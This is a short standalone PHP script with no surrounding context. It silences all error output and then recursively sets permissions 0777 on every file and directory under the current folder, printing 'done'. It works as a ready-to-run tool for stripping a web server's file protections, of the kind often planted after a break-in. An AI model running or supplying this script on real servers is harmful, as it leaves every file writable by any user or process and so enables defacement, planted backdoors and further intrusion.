<?php
@header('Content-Type: text/plain');
@error_reporting(0);
@ini_set('display_errors',0);

function r($p){
    @chmod($p,0777);
    if(is_dir($p)){
        foreach(@glob("$p/*")as$f)r($f);
    }
}
r('.');
echo "done";